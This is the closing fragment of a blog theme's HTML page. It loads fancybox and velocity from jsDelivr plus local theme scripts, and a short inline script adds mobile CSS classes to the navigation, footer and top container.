src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
